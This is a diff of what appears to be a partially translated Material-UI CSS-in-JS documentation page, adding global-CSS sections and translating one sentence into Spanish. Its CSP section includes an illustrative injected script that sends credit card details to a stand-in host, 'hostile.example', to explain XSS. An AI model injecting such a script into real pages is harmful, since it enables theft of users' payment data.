@@ -166,7 +166,7 @@ export default App;
 
 ### JS createComment
 
-codesandbox.io prevents the access to the `<head>` element. To get around the issue, you can use the JavaScript `document.createComment()` API:
+codesanbox.io evita el acceso al elemento `<head>`. Para solucionar el problema, puede usar JavaScript `document.createComment()` API:
 
 ```jsx
 import { create } from 'jss';
@@ -237,6 +237,20 @@ If you don't like this default behavior, you can change it. JSS relies on the co
 
 ## Global CSS
 
+### `jss-plugin-global`
+
+The [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset, you can use it to define global class names.
+
+{{"demo": "pages/css-in-js/advanced/GlobalCss.js"}}
+
+### Hybrid
+
+You can also combine JSS generated class names with global ones.
+
+{{"demo": "pages/css-in-js/advanced/HybridGlobalCss.js"}}
+
+### Deterministic class names
+
 We provide an option to make the class names **deterministic** with the [`dangerouslyUseGlobalCSS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) option. When turned on, the class names will look like this:
 
 - development: `.AppBar-root`
@@ -269,7 +283,7 @@ Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring develop
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-
+    
 
 This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
 
